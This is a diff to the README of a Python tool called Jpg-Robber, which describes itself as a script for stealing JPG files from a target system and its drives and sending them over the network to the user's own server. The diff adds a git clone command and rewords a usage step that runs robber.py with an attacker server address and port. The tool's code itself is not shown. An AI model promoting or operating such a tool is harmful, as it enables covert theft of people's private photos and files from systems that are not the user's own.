@@ -3,8 +3,11 @@ A python script for stealing Jpg files through the network.
 This script allows you to identify files with jpg format in the target system and  drives then quickly send and save files to your server through the network.
 
 ## Usage
+```bash
+git clone https://github.com/AmireNoori/Jpg-Robber.git
+```
 
-1-First, run this command in the path of the robber.py on your terminal:
+1-run this command in the path of the robber.py on your terminal:
 
 ```bash
 python robber.py [Your server IPV4] [Your custom port]
